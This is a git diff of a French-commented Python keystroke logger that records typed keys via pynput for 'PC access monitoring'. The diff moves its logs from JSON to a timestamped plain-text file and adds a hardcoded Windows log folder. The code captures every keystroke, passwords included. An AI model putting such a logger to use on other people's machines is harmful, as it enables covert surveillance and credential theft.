@@ -5,7 +5,6 @@ Clavier Save - Enregistre les frappes clavier pour surveiller l'accès au PC
 
 import os
 import sys
-import json
 import threading
 from datetime import datetime
 from pathlib import Path
@@ -14,11 +13,17 @@ from pynput.keyboard import Key, Listener
 import time
 
 class ClavierSave:
-    def __init__(self):
+    def __init__(self, custom_dir=None):
         self.keys = []
-        self.log_dir = Path.home() / '.clavier_save'
-        self.log_dir.mkdir(exist_ok=True)
-        self.log_file = self.log_dir / f'save_{datetime.now().strftime("%Y%m%d")}.json'
+
+        # Utiliser le dossier personnalisé ou le dossier par défaut
+        if custom_dir:
+            self.log_dir = Path(custom_dir)
+        else:
+            self.log_dir = Path.home() / '.clavier_save'
+
+        self.log_dir.mkdir(parents=True, exist_ok=True)
+        self.log_file = self.log_dir / f'save_{datetime.now().strftime("%Y%m%d")}.txt'
         self.session_start = datetime.now()
         self.running = True
 
@@ -53,14 +58,12 @@ class ClavierSave:
 
     def _save_log(self):
         try:
-            logs = []
-            if self.log_file.exists():
-                with open(self.log_file, 'r', encoding='utf-8') as f:
-                    logs = json.load(f)
-
-            logs.extend(self.keys)
-            with open(self.log_file, 'w', encoding='utf-8') as f:
-                json.dump(logs, f, ensure_ascii=False, indent=2)
+            # Ajouter les touches au fichier TXT
+            with open(self.log_file, 'a', encoding='utf-8') as f:
+                for entry in self.keys:
+                    timestamp = entry['timestamp']
+                    key = entry['key']
+                    f.write(f"[{timestamp}] {key}\n")
 
             self.keys = []
         except Exception as e:
@@ -86,7 +89,7 @@ class ClavierSave:
         self.running = False
         self._save_log()
 
-def run_gui():
+def run_gui(custom_dir=None):
     """Créer une interface GUI minimale avec icône de barre des tâches (Windows)"""
     try:
         import tkinter as tk
@@ -94,7 +97,7 @@ def run_gui():
         import pystray
         from PIL import Image, ImageDraw
 
-        monitor = ClavierSave()
+        monitor = ClavierSave(custom_dir=custom_dir)
 
         def create_image():
             width = 64
@@ -131,18 +134,23 @@ def run_gui():
 
     except ImportError:
         print("Mode console - dépendances GUI non disponibles")
-        monitor = ClavierSave()
+        monitor = ClavierSave(custom_dir=custom_dir)
         monitor.start()
 
 if __name__ == '__main__':
+    # Dossier personnalisé pour les logs
+    custom_log_dir = None
+    if sys.platform == 'win32':
+        custom_log_dir = r"C:\Users\FRMK0319APPF\Desktop\RAYON_SAUVEGARDE\GAETAN\IA\clavier_save"
+
     # Vérifier si on est sur Windows
     if sys.platform == 'win32':
         try:
-            run_gui()
+            run_gui(custom_dir=custom_log_dir)
         except Exception as e:
             print(f"Erreur GUI: {e}")
-            monitor = ClavierSave()
+            monitor = ClavierSave(custom_dir=custom_log_dir)
             monitor.start()
     else:
-        monitor = ClavierSave()
+        monitor = ClavierSave(custom_dir=custom_log_dir)
         monitor.start()
